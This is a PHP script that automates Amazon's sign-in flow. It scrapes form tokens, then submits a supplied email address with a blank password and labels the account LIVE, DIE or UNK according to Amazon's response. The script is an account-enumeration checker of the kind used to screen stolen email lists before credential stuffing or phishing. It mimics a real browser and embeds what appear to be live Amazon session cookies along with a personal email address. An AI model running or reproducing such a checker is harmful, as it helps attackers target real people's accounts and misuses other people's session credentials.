<?php

$ARGV = $argv[1];
$API = new AMZ();
$API->valid();

$v = $API->valid($ARGV);

if(preg_match('#We cannot find an account with that email address#', $v))
{
  echo "DIE" . PHP_EOL;
}
elseif(preg_match('#Password#', $v))
{
  echo "LIVE" . PHP_EOL;
}
else
{
  echo "UNK" . PHP_EOL;
}

class AMZ {
  public function getTOKEN()
  {
    $ch = curl_init();

    curl_setopt($ch, CURLOPT_URL, 'https://www.amazon.com/ap/signin?ie=UTF8&openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.com%2F%3Fref_%3Dnav_youraccount_switchacct%26&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=usflex&_encoding=UTF8&openid.mode=checkid_setup&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&switch_account=signin&ignoreAuthState=1&disableLoginPrepopulate=1&ref_=ap_sw_aa');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
    curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
    curl_setopt($ch, CURLOPT_COOKIEFILE, dirname(__FILE__) . DIRECTORY_SEPARATOR . 'cookies');

    $headers = array();
    $headers[] = 'Authority: www.amazon.com';
    $headers[] = 'Rtt: 50';
    $headers[] = 'Downlink: 4.65';
    $headers[] = 'Ect: 4g';
    $headers[] = 'Upgrade-Insecure-Requests: 1';
    $headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36';
    $headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
    $headers[] = 'Sec-Fetch-Site: same-origin';
    $headers[] = 'Sec-Fetch-Mode: navigate';
    $headers[] = 'Sec-Fetch-User: ?1';
    $headers[] = 'Sec-Fetch-Dest: document';
    $headers[] = 'Referer: https://www.amazon.com/ap/signin?openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.com%2F%3Fref_%3Dnav_youraccount_switchacct%26&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=usflex&openid.mode=checkid_setup&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&switch_account=picker&ignoreAuthState=1&_encoding=UTF8';
    $headers[] = 'Accept-Language: en-US,en;q=0.9,id;q=0.8';
    $headers[] = 'Cookie: session-id=130-2064789-1823133; sp-cdn=\"L5Z9:ID\"; skin=noskin; ubid-main=131-5777860-3774432; session-token=\"h7CHBruHC+DItJ1BfHciozAq65OdKIUReHS4kOGkxUgooZLLp+hgNGJGMW6vLaJZW9VL3Rf/a7yQbxjPutrApTusfC1A9Bz6OI53LClo4h5XWnTosbjn2W88vJAXVOsb0oPuh7NpK2pWpfHR17CIbzId/fbssK4814PmNFasfaLlZR4co970N9T97MHHoIoqL+DLcNJvX7IvTykJD27ZzXQqfUvxfv18wILUZesf6aQ=\"; x-main=\"M0pHAjr8pQGSnl6Q4nLsq2RamKgFsJE8ZRXY@wa09Qfu7TcDxIwBd92ct4VbjaRn\"; at-main=Atza|IwEBICtJdamHSF57gLrKwyErk-icpTSzZrJNP0a3DTff6Y_-SZ8O9wJWGc0MyK0YJYleDQ2vpVouyenacLtWpXUfnvOiEfyW3et7ZJfMCAUDM_gdruPWavYP83E2v2Xhp5xFA5aukv_JclJDzQyK-NTpK4la-6w-M8GDM8Ey9DvnBx92BoveH7BRMiZQWUN6Wt4uVi0BBikDqmepeAT2ndTuaM-KKmXwoC1vBC_icHmmGTbaQw; sess-at-main=\"6Hn8lWUKoDZlJrjztIOQm5M3VrMEfrf4YmdKiQ8Fj64=\"; sst-main=Sst1|PQEnw6fCZGPPCBqUWOEJx0rGCUp-ZxO9s6XHp5sZdWs3SUXJBmkGxb03OYqx90p_LgthMD2j0RR-F-0ZEHkHK4MrXzQSOrROeH4INXnorZDPIMhItYmykUKLGQXA2j4u9BpYwWhWnlDsIPsPdsWZumzLauzJWmhnJg5_Kw6P3cqLoH1YfAkF7EXh5kKG0kAU1b60ki4EVda_xu1zPuOTkW-XNQOcyJQE1QFtUD0H_KJFFwkdp49Bns-DY50NfBkZju7CDDVoAfhkbXwdpoYaS_DXvVKYpubwyZtZFIZUC97mgtQ; lc-main=en_US; x-amz-captcha-1=1600715674562127; x-amz-captcha-2=v9qJ5MNeHB9n0+UHG9e8Vw==; i18n-prefs=USD; session-id-time=2082787201l; csm-hit=adb:adblk_no&t:1600708496308&tb:9P2SHG5GYPH5FPN0J6A6+s-ZT4GYYNDF95QSNW59EBR|1600708496308';
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

    $TOKEN = curl_exec($ch);
    if (curl_errno($ch)) {
        echo 'Error:' . curl_error($ch);
    }
    curl_close($ch);
    $appAction = $this->mid($TOKEN, '"appActionToken" value="', '"');
    $openID = $this->mid($TOKEN, '"openid.return_to" value="', '"');
    $prevID = $this->mid($TOKEN, '"prevRID" value="', '"');
    $wfState = $this->mid($TOKEN, '"workflowState" value="', '"');
    
    return $this->save('details', json_encode(['appAction' => $appAction, 'openID' => $openID, 'prevID' => $prevID, 'wfState' => $wfState]), 'w');
  }
  
  public function valid($em = "gbdaimen7@gmail.com")
  {
    if(file_exists('details') == false) return $this->getTOKEN();
    else $TOKEN = json_decode(file_get_contents('details'), TRUE);
    $ch = curl_init();

    curl_setopt($ch, CURLOPT_URL, 'https://www.amazon.com/ap/signin');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, "appActionToken={$TOKEN['appAction']}&appAction=SIGNIN_PWD_COLLECT&subPageType=SignInClaimCollect&openid.return_to={$TOKEN['openID']}&prevRID={$TOKEN['prevID']}&workflowState={$TOKEN['wfState']}&email={$em}&password=&create=0&metadata1=ECdITeCs%3AmYvgJqj7oT3dZKb9b9eDF0p8LRIweYLndnAi1RGvkm%2F7N4VGsiyg07wpfkB8bKB3tBVvH07%2Fuv9SKWj9FSq11gRQlZf%2FcfNRTCxgSRVRAp7Iv3ES2ghcD7VK9N%2BerXgWN%2FBKo322qsBbpBTXwo92NFW%2B%2F8oXz0l6wzl897BPApuUFCLWw9x7q37qD6btY5guthrH4k7ApeksU4Ex5k%2BsfzS3ugBgF6xYCTCUocr8hM7qKQJ%2F%2BYUIWwFTFwWgUDsoyUAxFNzkCFTpLeY%2BM89ShMGEQmL6RDGXOlPODXsbrYrGUJYnDfxHsXQl1wWGffW1ZxMIY%2B8oVm0gWUrBAUnelABM7Kco1V%2FjuW7710zn%2FKnpK9YbYDSPH5eodnF4B1eEQvWwAiC%2BIpkmB3USiD69qElJNcLaKtAvpQjSsWm0z18NYrqo2ukO2BN225pDGyLgRztEt%2B2fGaCsUNzAaYIKbFhcYn3cW2Q2gVYzO%2B9om1S%2BR%2F7D2hm%2B%2Fw%2FjtgBn4S2IluIlUH0mPkus5SLF3X9Kn1tIfoT1qVFiJ%2FGrSj%2FZd6GTJlC83rquEAI66yoasGn%2Fsv0daWhHalqel1CsldmKLg7bGsdOtcGysYCWYl2r67xRqFGA40PMMR5XSxNw%2BFaTS2mMv2m3TRDOScHjlWDEQVneg3L3jJ4CjgnGw2ooZucmHNdfmyM6m5a1UZs1WJG6BTcZwSL9cBXUutwaZcJZMefkxZLBrkzgxq6jZmB%2Fygn8QnykMMjmpbM%2Fytd1jZuwxrSb6xIKNyj401%2F2RRu97vGVmDHQOiLJ40N5Bsw5R%2F9uUoWN2JunHU2FKxK8gFhJ0OEib2UTqSGb9T6clTWjOgo6gTBR4hKXpS4OjkVL5Px2Cunn7InLpATK9Exbbu5eM%2FHDW%2FqVZi0FkWK70XpLj%2BQIUZfpCRKTjVMnlz5L%2FkIKb4VoObf%2F%2FjlcpMMQ%2FVqAwFJz7RhJscCjMCv5NbBGnc8O4rWjoNd14eJWNSllyUOJK09KBjNY4cDOLiw3grfGEibXIoczT9hyESCAR4dNPyAKksKj6KIaAwVL2aXIcwp5jLgpNSmRDTiWniJ61OTY400DQWfkUEougHbbgpvvNVOgIb7q3Gr5iCiQet9dzTPSi6cTuiAJ2WNLxEv6upk1kisJw6z44vui4SZt2tjdNk1R0IEhfOjOgVpBDDoQsgWz60zK8QZ4Vm11dSexzl8I7D5sdXc6571Yr7ieEdpeMPcd%2FNjg1gMMZ9U8H7e2N%2BBkK2bPTg%2FljP4GEhV3zPRRg1PM3O7kkZDcuFjtzkGFlN29gY23SXNLEIv%2F8oH1z7ui7LIxzb3W4ELpS8Ad%2FELsACJ9rmqA%2BQkPRwd3JhtKe%2FEfXxVMrVYAJDFXwuUxJOgfvqn%2FFFe43nWu5PaA0OUU16ztXKOP6fIfeWDJP22iRUYhcO5%2BPDlvgFZWj3xzlQjUT3aQZP8z0C68q56O5dUeBP0TssabfYMEtSPrDTg570qX9LYheQo%2Bz5X5OkbipR69Z2hTvg1XQr4wQOFPhlxUMiq4PE6I59aa%2BDXHoi7uUTod5FMdtPYlccNYigjAZSe47CjymiPt9ZFLh9P9ZkwDwjnE2TfRNeNZ6tSoQhZ2M4ESl1mHfWutPmIExOpiyjAHE199gwPa26t%2F%2BTR69iMzwv7g9bLSilBiDgyqnwOx32UUa5T36GNSk8bC%2FAyDilIhRRx7LG%2BxFM%2BhsvVhyxtznkk49d965tQjUveks4IOYyCbN7Fb0dq01UVakpDZhQHYo%2FvtsfMroQwXDJnbnQ27kAKFndU73DP3OT0gVoDdQ6OOtsXiN0aXJt1OI%2B7Ui32yz9Cv42H9y5sePy%2Bv5CvfdZKTm4jHgHTNzt%2Fdq2osiKPFV5WIZYG2IkORcV7LWULJIGaqFLjNWBD%2FiTkMGODWPccrT2fNWMXifAXaNPqFZnzCwKHyxYdzMemWSDgaY0G2cH5mCMTSnUJgxp3BxnKP86UmhFkbHZ%2FqB%2BIL0PlAMYAtjXWXZid3IKN6%2F%2Byma089FzhVmBt2c%2B%2FtajFhVkVHGOOtVx7zfvUH41fxyN4cXIZQ2LqAhzlFY4Q8jLkrq70S81WGmfr4eRVqaKUC39QwbzlrojzR18cpf6m7hdwWzLhJF%2Bh1wS95pjHo8pGHBn10lRGM0w%2F2LykB%2BDlMuf%2B055DxYHJEHEMYjuD7YjgNyiYlyqUYbRPvtblQkiO4cdpilF4TyihDlmMiPgNMx6JQwlmKZVPvIFhQGao%2BCqQhS4J6cmzyPDrf5UZOJWwhVfyjSxn21ic0ImQ3cHOwjvATBu9rtr6LjLQt5lLZjmkpZgMFXSjiSFhE25fWEuWxsd7R2Dw8ZViU5wxsdl6QCKYw%2F%2FmEwrr5MDt9kNLAt6Nonh6Ilr%2F6UiXNuSg%2B%2FN8KGO5O4XtMtsBsDJqzVD8bfNegPY5woE6UykR1%2FqQ6Oeaib5xdhpRrlPXo6zoSgzpHRcxGiGkn49Ogup%2BhZav2rWCnBC%2BkZ77iw%2FNhO7m37HjVD9LCLrRjj8fekbqrMVK%2Fv177RFuPX1tzBdv7WzsQTsm9SGcPQoFDjuLDcVyNUCjlY6bHMYpUtZ6qNU3B86v0IHov9Vzs%2BkI9SS4ttfBuG8L6za5HqF%2B3WLDfNnuF%2BIU0mXGlAr4ndhacyYP2wjA6gLCF%2FDScHfIOeerrV04GRjktIoiJRyvZcPQV8pMKXe6QEKcST7nTVFlh0Cxw5Zdh3WBxCzvROPmbUZTKZGAs6cBrMV979HwKB%2Fqcllw9w41AcJ%2B40nEm%2FYkmciTZ6BDw3EUwiPaNRKqs%2BbGKzcO%2FAwsrPg5S4V161Lc2S3njQNxHoh0j70hDydoqNwuaZJsV5FCxXOnBKPeaJf%2Fax0JQXFADJBLAL9v6sWG0uSthMrGwLC7kvMA6pbHRaCPYYLt2gBTY6pEsDChh4eN%2BePPwGY3VcwRUAy9eZcZkJJ2Q3t2v6mZO8llHXMjg97Frl7OVuyFdBPHewEXVaB2R9eUgkIRmkzl%2Bmj5DeL2APPtvXezWjCkoLACrdwJSKxkIUI7wqgKzprhWoTBTHSVEm9z1k5%2FAnN%2Bs4lxBU8NNLkL1%2BL1flLdmEBe4V5up9CVdfX%2BgL8cdZZAWQRZnOrOUTN68D8BJawl2i6E18QbxqXH8e%2BUUNX21j1OeC98iNuKFZmB%2BhELGe7X4JuiZEh8o0aBJy3Lgi8N7QA%2FcH7p9yjbnayFn1LHlAK6u0ItO8Hd6ad1iHluRPAB2IAno1YtEMzifrTP%2BnJ9ofBRNuvu%2BLkZJNJVTCrz5mFlVs0GYe3lbRD0ZmtZwSo1%2Fb3GkIICazmkzPXfiuqT4C6D6n7QZwuNjn%2Flvpt%2BXcIRlyeBxb5PrKflHaVF%2BM1zA%2Bpu6DAUc5RlfKovvkslpMjdnqT1jihMIifXc2MgauGz4e9u12E7GXKnGcOHW3iMDwaDe7Qv1sWGcQknduz1IaGnDndADaTGSHFZ3ao9h1pT1VCo42kutp7o%2FJAZ25Pshm%2FRJ81KOWZwxH67gfGnCNijKQg7d1SKo11TG6KBQut9UjRHoojIhxgtOr6W%2FDpzCRNPPtutxn99MHyp1vLBfUR7SOVPIW3HH99eHjxKo8i21fgW8xP%2F%2B6uFLx%2FIF5OBoo7X4Iag7ic5ztDGaGLj%2BhxjdipLkrbdCpzd9tfDS2Lb%2FFXwfs%2FZJZoi86e%2FjlNB%2F8GWwhlykA5revBRxC4krgNISBupFwLG8UWxQHylNxz9KdkeHfT83oebUuPf8bNVVszB2Wnvr90EL2q8I2ZeMw3562jZYRL2kALr4B1ZV%2Fi7p4MZ8X%2FZdbDpVHBIlYMr1sGZDqj6kp6MRLApZaadIjt2siLAY%2F82RPiQ%2B2D8M0hRg58lvBodeYB%2FPfA5TgjN%2FybW1ELDyBtdgmtKpkhF3ETyUcdFhCnPZ%2FeqmEQnbtt7%2FSyFvMQJEd9BkQK%2B0rJcrfTH2NTZ%2Fe6jGVjyjj%2Br%2FobfBvTo4TPOmME9ezx5dVjfI7znMAMKRGiUjwx%2BLV0ZE8B6IvVSshB%2FRwFdiOxtg661QG4GW6i9brwygAxJ7DG7cXALjLXwtrOCiMHRHUeVY9VTNNFv6DITpHJIcOuvbBjQkGfRH7Z70Bp%2FhvB2Gp5nmDXzA%2BltfbGzcv%2FRHEbjMMLx%2BKJG0wY%2BW11E%2BflrRwvk68%2FyU%2BWGNSzlevpwNXAoxePoMpcJg%2BLSkb0W%2BSc9BUlb%2BomoyI5EEQ%2Bv6aeEKO82C7ClkPtxA54smmkMRgLhn4ZWZSLJwBlBEwQkS2DyMI2QsSIFxhX729sxXkiDlJ1oOiu3Aet7RbKZxbmfmoaEkuo%2BANcmyWgP7DDCtqECBgnSt7Jz9KvJt8R2lzQu9SaOI%2BC8cWP8AB7r6AM86oyjqz84JZ18AvzTwOnAy%2F1%2FTpHvsjxgATNBJawwR%2B1frdAASehZ0VgBGH%2BFZ1JAnQJwdcu3ZpkvujRxFzvCno32mblEGc3taVwZeWZzxLEIGEd6Y2DPsuARi3TEK1%2FlrAfR0GJpc7aEezahPSudnqmQ233h6PZlhsEGfoVU%2B%2ByBr6C01DzaPmOOgJRKYNR1hYLCNm0n3%2BCKpt80hJ6LqT6WNW%2FupkpFL2F01O2fhEWda7z7RjGUoqisKHXO%2F8Lhqp1flvRS9BOF2LAKZ4YSNVerBwn5n31mrK5pgZFBwRgdzGVH3YL%2Bb7TeAZv%2FqWWZbg8wZllubN34J5xG9Q96psFXuQGdwCH9MESqfPjiijWn3TEK3UBoaIfvLergy8AVmBmx0VsSGQXeiiP404cwvyRWlNQ1iTZzYE4NOgGjMOZ1FkHQ56%2BOS9D24%2FKCPhtMCwB7VshQAlKBPdE67pgESRV6aLuZZwzxSGOoXaZWf38VFiblFMSXNdLfLdMIYNC56SHojhaA0KysOJTOxIqFbytckrx%2FLispbbGs2zDPgOQyh%2BtleSTi0y%2BccVkhhPif8EndxKHD0t%2BjFqrXEyDQkUbkrO8MphKXMn6tG4hHsrzT%2FiYC%2BxIcSNIX3eVKPvoXG7zt2ydxvUoaT5o9VkUe%2F%2BYDpZlQ8As8alE3fGfGs1Wa6x%2ByisYPkQKXjeu2K5tFCutiuEa3UUn7Z9RdO4aeMErCDjy7HwIEDbP7eBahMl%2B0aR8q6UxJWCTlczAbzQy49pJrCFPJHl1HaJRO5KZj7NG9qWdG7XorDplxUSsJcIzVMK31dABwL8hFjgno4ZdpfFWm4dpjDO24lSCVTQ926LekQsZJy33phpcyqb7CEQPK5uLOWh4DpOA1vLulwylQA1MpdfkyU89nrHcQbNabT1dQcP9tSOtyZXkuGpXuIDYwOSP%2FEf5WufjxHHKGbsww0j5B%2FQvJ%2FbVwqLfB%2BPBagRRZAA4mJwyTmQjA8Ao63cLzcUAiBplU798b3MywRG1EniuMA%2BJN6tiaFGlht0R%2FtsrvepADUgdG09%2FzuL%2FJq6pynsr7tSu28oZDl%2B9DrxbwaFIbAAqTAb7et55j2uy2xDHC30QemvKYAHhjfYB%2BtP%2FOT6XJchdDs%2F9Gvias97Ku8e5EbrONFohpg3B0vQk%2FxXs%2B%2FFGoZnL2OMvArcYkFd%2BmPhz4d9Glj13UOEHzjncjRQ6Xs6jZHruewFtc5Yoj4YK2HR3khstXP9r0jgeNv1yUj1gjrxrOdf9v%2BwysGiWTIe9FtXyjFgrBUQCPm%2FFt2T%2FE7hxkxV%2FkoosRrBo5bEFAleOHFwUlNcU2HAzQTF0UxZoL1E9kWCF%2FrCZafjGXhXdexkUbghuyUDbVSKQLJQ1g4AIwQQUILH8Y30GG6bPdlQ7nn0lHXbXg77FU4%2BUmTdQCNzVpZlG5lH00ui7uFzoFTNUwj6dsEqZKKGIMtFHrmhPAcbGSWZSieA1iLLTM4xURyT9amPA5L4zjGJ7cLyJugJnCnVgfRYLdtWLZOuyCbXhU00wRtorfy4rnnP21SEwlTbXvhpo7lb8FZ%2BqNrSDyu5STngPIqs9A0OYhX0lrv2dtf2Oj9B47TPlDEzrC50ZFG7N4gbGtnirMDXBUwFcC8nzxYRZt2BWch%2FV2WIc9Za74AWt5rLLFbe5j88zg1JxKINwnGtgqECaLVamBIVtDX9GuBdRvDipllAfxOeE5BfsrvR%2BUQsVQm19lbaM%2FdO3obOsJgok3Nl8V2leI6O%2FVg6q3O3u2lNJgnS2iNoQlCdqGt3fan83VkcMGarqvgl6v79ELgaffLYK8sGTcswQ9LpxIs%2Bb20l3OE8wLQIabbsj6yMqr01gx2CK7kZJbB%2BpWqJ9yLutUdjYT6D1yUrfQ%2BNPY8Uk79yQHGm4606rL5JWqGiwkFvJu2%2FJYxWEGyah2PP2Yfql1fijellK7iB9J7jlUAHcY4wKHbU5mgESH9sO6u0dS%2F9riMgP2vci1Y97JsDL99vAZy%2Fno5GlX%2BYNwAbTxTMnI%2FKpTUSuHSbW6j%2Brh1louhPqBOUH2aOv5AwNH96j2QzoFzyKsDIv4LerHcZc7Pt%2B%2B%2BXOOQ91s0jjFWd2ZHTOj1VKq7dHnX08%2F%2B%2BIZlKrFcu297MIx7X2x02ztqNTiYkt%2B1Eqy7PEpfClZG0EsoUsRoKL8UsNY4tiWtfy%2FpYfqbMuKfhdJ%2F0I8Ilr4xjXHHgTzlfITidvKguDbs1diD59EGgUyDUVPAZD1q5oCgSRABcuua2MThoVVnvup4hyVpGGK8oGpDKK9rKlPTP1IQxl2yz%2Fhh9ppuhwJqV7VeIVNGohp6%2FpxitE88YPOBDPIQ4L%2BT4Q5GizKJ4NfubjSFlUf%2BB1n3j32idiQZbq6P8IbLo5FxdkiY0GbBJ%2FW4ArER6h%2FhgNtmoo8RBZEFzx3DrZjYcqRU%2FZAZUnjRYg1bmnfBny5txcwlSduJB5vkXroviuRv%2FE3yBA2HGwzgLDkHh5RLD2NVzxiDUOXntUtu2buNuts9XiYr7ArB5Fs1w7SVwV%2B2HtFSClgH6Hjf9PvKcBPcEnjSF3aGvF3Lee7pGWgVWcGwdToeP2BuaG8rnZIpf5wahMoP2gJmeCC9WmbtzS3vNbDtEAz9Z7QKVvZoUmbKqKv9KisEzTyIW8SIQLEq%2FycOBvm1V715WaKbzAzpNUXLnfB3R2MgZDOxRw3krvL5et5eRzZcER%2Fn8b8hhQwKmQCy5io4%2BrjmjaSmDUB79FgAHhrszrgExz7z6jd%2Fvm%2BeBTC8bvgaHa%2BByqa%2FCdkCahynAg6jiT6%2B0AgCeyyj5y0KhcYuAYiigHxPztMR%2BNZ8uqUpmnqf6O3CiWe7x5LCW%2F15PgjXZjCvfp%2FQnLF9kVPx5T2ubG8DwjpRrzBnTEriELEdb6to029QL4SJIiXhNpULiGH2W6iB6IQ7v3cCkP97ZIrd0b%2B0S5ekRU5CY8LXH15%2BmFJ%2Fk5sWrZatGVX9%2BfDR3sxUQGXHQqmjnhGqiUKSpaCREfrF0yua5hg53fYwWfDXvz3quBnRdnSV4EzQFMNhvoAfrHx18BRYaA%2Bt%2FnMUdtoP56mSGQaZyofuo%2Fl8Dm3XWTgA9ZUDluLmaS3CJZj4IfflZBsHNykjp8CLlw3wU2jMXgihrIckJlEtwGHtbwP%2FQSma1hzvOBUsf0xGl9%2F7ACQ%2F0YAIzvQnBmcoB5Lh%2Fi60mvr4h%2F4YOLmWPD1nqOlKWnlHr1fc4dTblctAfK0gTZ6fAey4Q1rhmlX5%2FKdrU1%2B4DRmXuVxT%2FuZfmZ04hNrGbfRaqgbKu46aiPEVzYc63apG4GSuzKgqv9nuEl9ZdM3uCjIici26kBi3jOXNt%2BnPyXNAJw6vS1fml5Jp2GSp%2B3xCEVxII6zCVxkmnvGjaOYDeEM6W2Jt6GOy%2FphwBMB2CXEX%2BtDu%2B2HOVMekwBtgNwjJ%2BLhA5VsDId48tGDobskQY9gi08e20NLxn5iUW6ezACbELIghqvHxGUnIrZ6TRo16Ap47KqLiCqpK25pVRvfF4no%2FbdA36g3UtDu4XbOzepJAEZhIXvu9c2dTNGm2j8lMuvzEAaI98HvYAqLwV2OEmcH50%2FeVs0yYzs3UpcdqUum4%2B6ZiOLLMqrgVePcVVfbbxuoXpiLmeKgi6g34020fwiriXvc0Rwcia3rUba%2FonWppM5QLYe7bsAiEKxB3WRGcUfJYIoh5e76TKoOHdwJTIE9TuEXbykiaodstcleLmGavchmL%2B8AU0lZtwTGgcdMi%2FgZJ7Z6bRNXSzyw9HCNJE1T9TPxA86odbb2HeEcywnHTSg0UR4Cv%2FLkygDa86UA7emGbA21yjwCdOOfL6HsHrpKaIQbDxU%2BfMxhmf82nwHmrkKlVDBnuJ2xhlqfsVVTTBwJKGzjKciihNHLmhLd2bjqUsDOkUGhUIDl4LcqeElqdWDaHoI97GV2DDK2o1uOPWzQ9OhVHwi90efjeEyTmoXQpVbmYt%2BIN0kbC5Fy%2BYIsXOZJqtydrWZFZOhP4Q4DXB046sRPpTsNsDmBkisb5dD3rcJUl3ALtG4Va%2B1tRNWBcgcZUo5u1UfEVOBkw2p%2F%2B5XE5iIZGx8mcSGf0ekwUxdIQTlEaeU%2Fnpfr116hSGq2ZdywjG4xVYSlRSTWC3ngk3cIEfZfyljSabvXGgIa135MkUptgOMg%2BrhJZwm%2FlRpLr3eIUkZ6VKwEhX9VZvpVSRoBoeiE%2BUJB6nvE6uhZLGJXSRZjjHdCP8M0MHSbvavisDggRLkW%2FaV8Ipw%2F9P4%2B%2B6y3hUwQnGKwOvKdqajz4x9z%2Bt4lU8sM6KLshJ4mN%2FOyi65GswzwCkgOhk70gqIgcctFiNtWoxteTuTrqoBbhfE1sRfF%2FqbHJAAQ7woj6MzZQIAoNMxX2naekXhsLXVk4ZQ936A5kgatoWgMX9PxKvaOHQBcCf%2BFEAJzxKxAS0yTof1AKvGNl893%2Fr9UvVCwK%2BwtH9oWLhVOuL3Hx8vDbp9cqD9xlVdhJcZwurTRYfZTGrowtu%2FuaxzXq388IHZJdKpauS7AHpWt8v%2BL5r4PW8jP%2Bk0T278KeztaEjkyPpnRyD%2Fl7Cl9r38nVpUhOcG%2FjQ9I61nVMn8h97qZgLe3eODYyPZM6dtDPtYOMjkHN1s512TsF4ZPOyLtyNdiwEtRkWdZ3JBW7FQ%2FYNoN%2FANBGxW%2FSDWW1BvcbrnfIktywFLft6zcp5HPHQOhwK0NS%2BMIBeCNNLGL2qCJ54Ydyi3oXVZ1X7AT0nc6NEsCiuBn6Xn6tm8W3UkYShwxmoxj5rA7mIOrrEktU4YLMl%2BBmuV9EcfF4tYb0EK1iZTjD1wtp6Rxa2a%2BIERSfF6%2FbrRc7qNutXgUNIxle2S%2B2jDnZZSajww%3D%3D");
    curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
    curl_setopt($ch, CURLOPT_COOKIEFILE, dirname(__FILE__) . DIRECTORY_SEPARATOR . 'cookies');

    $headers = array();
    $headers[] = 'Authority: www.amazon.com';
    $headers[] = 'Cache-Control: max-age=0';
    $headers[] = 'Rtt: 50';
    $headers[] = 'Downlink: 10';
    $headers[] = 'Ect: 4g';
    $headers[] = 'Upgrade-Insecure-Requests: 1';
    $headers[] = 'Origin: https://www.amazon.com';
    $headers[] = 'Content-Type: application/x-www-form-urlencoded';
    $headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36';
    $headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
    $headers[] = 'Sec-Fetch-Site: same-origin';
    $headers[] = 'Sec-Fetch-Mode: navigate';
    $headers[] = 'Sec-Fetch-User: ?1';
    $headers[] = 'Sec-Fetch-Dest: document';
    $headers[] = 'Referer: https://www.amazon.com/ap/signin?ie=UTF8&openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.com%2F%3Fref_%3Dnav_youraccount_switchacct%26&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=usflex&_encoding=UTF8&openid.mode=checkid_setup&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&switch_account=signin&ignoreAuthState=1&disableLoginPrepopulate=1&ref_=ap_sw_aa';
    $headers[] = 'Accept-Language: en-US,en;q=0.9,id;q=0.8';
    $headers[] = 'Cookie: session-id=130-2064789-1823133; sp-cdn=\"L5Z9:ID\"; skin=noskin; ubid-main=131-5777860-3774432; session-token=\"h7CHBruHC+DItJ1BfHciozAq65OdKIUReHS4kOGkxUgooZLLp+hgNGJGMW6vLaJZW9VL3Rf/a7yQbxjPutrApTusfC1A9Bz6OI53LClo4h5XWnTosbjn2W88vJAXVOsb0oPuh7NpK2pWpfHR17CIbzId/fbssK4814PmNFasfaLlZR4co970N9T97MHHoIoqL+DLcNJvX7IvTykJD27ZzXQqfUvxfv18wILUZesf6aQ=\"; x-main=\"M0pHAjr8pQGSnl6Q4nLsq2RamKgFsJE8ZRXY@wa09Qfu7TcDxIwBd92ct4VbjaRn\"; at-main=Atza|IwEBICtJdamHSF57gLrKwyErk-icpTSzZrJNP0a3DTff6Y_-SZ8O9wJWGc0MyK0YJYleDQ2vpVouyenacLtWpXUfnvOiEfyW3et7ZJfMCAUDM_gdruPWavYP83E2v2Xhp5xFA5aukv_JclJDzQyK-NTpK4la-6w-M8GDM8Ey9DvnBx92BoveH7BRMiZQWUN6Wt4uVi0BBikDqmepeAT2ndTuaM-KKmXwoC1vBC_icHmmGTbaQw; sess-at-main=\"6Hn8lWUKoDZlJrjztIOQm5M3VrMEfrf4YmdKiQ8Fj64=\"; sst-main=Sst1|PQEnw6fCZGPPCBqUWOEJx0rGCUp-ZxO9s6XHp5sZdWs3SUXJBmkGxb03OYqx90p_LgthMD2j0RR-F-0ZEHkHK4MrXzQSOrROeH4INXnorZDPIMhItYmykUKLGQXA2j4u9BpYwWhWnlDsIPsPdsWZumzLauzJWmhnJg5_Kw6P3cqLoH1YfAkF7EXh5kKG0kAU1b60ki4EVda_xu1zPuOTkW-XNQOcyJQE1QFtUD0H_KJFFwkdp49Bns-DY50NfBkZju7CDDVoAfhkbXwdpoYaS_DXvVKYpubwyZtZFIZUC97mgtQ; lc-main=en_US; x-amz-captcha-1=1600715674562127; x-amz-captcha-2=v9qJ5MNeHB9n0+UHG9e8Vw==; i18n-prefs=USD; session-id-time=2231428841l; csm-hit=adb:adblk_no&t:1600709434737&tb:9P2SHG5GYPH5FPN0J6A6+b-3MHZ2XNNNVN57QTB8H10|1600709434737';
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

    $result = curl_exec($ch);
    if (curl_errno($ch)) {
        echo 'Error:' . curl_error($ch);
    }
    curl_close($ch);
    if(preg_match('#Password#', $result) == false && $em == 'gbdaimen7@gmail.com') return $this->getTOKEN();
    else return $result;
  }
  
  public function mid($string, $start, $end)
  {
    $string = explode($start, $string)[1];
    $string = explode($end, $string)[0];
    return $string;
  }
  
  public function save($file, $content, $perm = 'a')
  {
    $f = fopen($file, $perm);
    fwrite($f, $content);
    fclose($f);
  }
}